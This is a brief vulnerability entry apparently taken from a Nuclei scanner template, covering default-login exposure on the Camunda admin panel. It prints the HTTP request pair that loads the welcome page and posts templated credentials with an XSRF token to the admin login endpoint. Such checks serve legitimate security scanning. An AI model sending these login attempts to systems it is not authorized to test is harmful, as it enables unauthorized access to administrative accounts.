# Vulnerability: Camunda - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`camunda-default-login.yaml`)

## Description
Camunda login panel contains a default login vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /camunda/app/welcome/default/ HTTP/1.1
Host: {{Hostname}}

POST /camunda/api/admin/auth/user/default/login/welcome HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: application/json, text/plain, */*
X-Xsrf-Token: {{xsrf_token}}

username={{username}}&password={{password}}
```

